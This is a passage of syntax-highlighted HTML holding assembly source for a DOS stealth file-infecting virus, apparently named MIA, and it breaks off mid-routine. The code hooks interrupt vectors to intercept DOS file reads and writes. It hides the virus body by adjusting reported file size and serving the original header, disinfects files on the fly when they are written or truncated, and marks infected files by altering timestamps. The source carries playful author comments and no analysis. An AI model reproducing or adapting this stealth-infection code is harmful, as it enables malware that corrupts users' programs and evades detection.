 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0018h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
                               </span><span class="sc1">; Check whether file's really infected of not</span><span class="sc0">
</span><span class="sc5">Seamless</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EBFCh</span><span class="sc0">              </span><span class="sc1">; CLD + short JMP opcode??</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Undone</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">                </span><span class="sc1">; 48h ?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Scrap</span><span class="sc0">                  </span><span class="sc1">; If ZF=1, the file has really been infected</span><span class="sc0">

</span><span class="sc5">Undone</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Frantic</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get offset of INT 03h from IVT</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Viral_Interrupt</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get segment of INT 03h from IVT</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Viral_Interrupt</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">               </span><span class="sc1">; 3 bytes to patch</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0090h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Load the vector of INT 24h from IVT</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Replacement</span><span class="sc0">  
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Exposure</span><span class="sc0">               </span><span class="sc1">; Patch/dispatch it! </span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Unload</span><span class="sc0">                 </span><span class="sc1">; Pop all registers and return</span><span class="sc0">


              </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Est</span><span class="sc0"> </span><span class="sc5">modus</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">rebus</span><span class="sc0"> </span><span class="sc5">sunt</span><span class="sc0"> </span><span class="sc5">certi</span><span class="sc0"> </span><span class="sc5">denique</span><span class="sc0"> </span><span class="sc5">fines</span><span class="sc0">


</span><span class="sc5">Overlook</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowSiz</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Read_Head</span><span class="sc0">              </span><span class="sc1">; Make sure it's infected, if yes decrypt the</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Farewell</span><span class="sc0">               </span><span class="sc1">; original header</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_BOF</span><span class="sc0">              </span><span class="sc1">; Move R/W pointer to BOF</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">; Write data at DS:DX to file at current position</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">               
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">              </span><span class="sc1">; Move R/W pointer backward from EOF (EOV)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirEnd</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; And truncate the file!</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Get file date/time stamps</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C7h</span><span class="sc0"> 
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Farewell</span><span class="sc0">               
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">                </span><span class="sc1">; Millenium 2 rules... 8-D</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Farewell</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Restore_Pointer</span><span class="sc0">        </span><span class="sc1">; Restore R/W position and pass control to DOS</span><span class="sc0">


                   </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Lento</span><span class="sc0"> </span><span class="sc5">sed</span><span class="sc0"> </span><span class="sc5">certo</span><span class="sc0"> </span><span class="sc5">et</span><span class="sc0"> </span><span class="sc5">recto</span><span class="sc0"> </span><span class="sc5">gradu...</span><span class="sc0">


</span><span class="sc5">Disinfect</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Overlook</span><span class="sc0">               </span><span class="sc1">; Jump if SF=1, must disinfect the file!</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Detach</span><span class="sc0">                 </span><span class="sc1">; Branch if ZF=0</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Overlook</span><span class="sc0">               </span><span class="sc1">; Jump if CF=1, user tries to enlarge file size,</span><span class="sc0">
                               </span><span class="sc1">; disinfect the file!</span><span class="sc0">
</span><span class="sc5">Detach</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jcxz</span><span class="sc0">   </span><span class="sc5">Overlook</span><span class="sc0">               </span><span class="sc1">; Jump if CX=zero, user tries to truncate file</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">jge</span><span class="sc0">    </span><span class="sc5">Generic</span><span class="sc0">                </span><span class="sc1">; Branch if SF = OF</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0018h</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Overlook</span><span class="sc0">               </span><span class="sc1">; Jump if below 24, user tries to write to</span><span class="sc0">
                               </span><span class="sc1">; header area, disinfect the file!</span><span class="sc0">
</span><span class="sc5">Generic</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Restore all registers</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; and flags</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Execute DOS request</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">                         </span><span class="sc1">; Push flags</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Salvation</span><span class="sc0">
 </span><span class="sc6">pusha</span><span class="sc0">                         </span><span class="sc1">; Save all registers except segment ones</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Get file date/time stamps</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">           
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">Futuristic</span><span class="sc0">             </span><span class="sc1">; Jump if not below</span><span class="sc0">
 </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C7h</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Set file date/time stamps</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Futuristic</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popa</span><span class="sc0">                          </span><span class="sc1">; Restore all registers except segment ones</span><span class="sc0">

</span><span class="sc5">Salvation</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Request</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=3Fh/40h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Fervour</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Verify</span><span class="sc0">                 </span><span class="sc1">; ????</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">R_Bytes</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Save bytes count</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ReadOff</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; Save buffer offset</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseeker</span><span class="sc0">                </span><span class="sc1">; Get pointer's current position</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowPos</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiPos</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; And store it onto stack</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HeadSiz</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Make it zero</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_EOF</span><span class="sc0">              </span><span class="sc1">; Move pointer to EOF and get file size DX:AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowSiz</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiSiz</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save it too</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiPos</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Move pointer back to previous position</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; CX = Bytes to read</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowSiz</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get low-word file size</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiSiz</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get high-word file size</span><span class="sc0">

 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">              </span><span class="sc1">; Adjust file size - virus length</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Too_Small</span><span class="sc0">              </span><span class="sc1">; File size is smaller than virus length?</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Subtract current R/W position from it</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiPos</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Readfile</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; Restore flags state</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Disinfect</span><span class="sc0">

</span><span class="sc5">Insufficient</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Return AX = zero</span><span class="sc0">

</span><span class="sc5">Outland</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SS:[BP+10h] = AX on stack</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc2">0FEh</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Unclasp</span><span class="sc0">

</span><span class="sc5">Readfile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Insufficient</span><span class="sc0">           </span><span class="sc1">; Jump if read pointer reaches MIA's body</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Auspice</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; Did He try to read too many bytes?</span><span class="sc0">
 </span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">Auspice</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">R_Bytes</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Who dares to harm My sweet MIA ?? 8-S</span><span class="sc0">

</span><span class="sc5">Auspice</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiPos</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Across 64K boundary??</span><span class="sc0">
 </span><span class="sc6">jnl</span><span class="sc0">    </span><span class="sc5">Overcross</span><span class="sc0">              </span><span class="sc1">; Jump if so</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0018h</span><span class="sc0">               </span><span class="sc1">; Pointer is within header?</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Backspin</span><span class="sc0">               </span><span class="sc1">; Jump if so</span><span class="sc0">

</span><span class="sc5">Overcross</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read the rest of file</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadOff</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">05h</span><span class="sc0">                    </span><span class="sc1">; ADD  AX,XXXX</span><span class="sc0">

</span><span class="sc5">HeadSiz</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1983h</span><span class="sc0">               </span><span class="sc1">; AX holds number of bytes been read</span><span class="sc0">

 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Outland</span><span class="sc0">

</span><span class="sc5">Backspin</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">R_Bytes</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Position + number of bytes to read</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0017h</span><span class="sc0">               </span><span class="sc1">; Exceed 24 bytes range?</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Flexible</span><span class="sc0">               </span><span class="sc1">; Jump if below or equal</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0018h</span><span class="sc0">


                      </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Labora</span><span class="sc0"> </span><span class="sc5">ut</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">aeternum</span><span class="sc0"> </span><span class="sc5">vivas</span><span class="sc0">


</span><span class="sc5">Flexible</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc0">               </span><span class="sc1">; (Negative)</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; Re-swap it to positive, DI = remainder</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiSiz</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get infected size</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowSiz</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Read_Head</span><span class="sc0">              </span><span class="sc1">; Read original file header within virus body</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Viral_Phile</span><span class="sc0">            </span><span class="sc1">; and check whether it's really infected or not</span><span class="sc0">

</span><span class="sc5">Restore_Pointer</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Lseek to original location</span><span class="sc0">

</span><span class="sc5">Too_Small</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Make_Stand</span><span class="sc0">       </span><span class="sc1">; Bye, bye...</span><span class="sc0">

</span><span class="sc5">Viral_Phile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
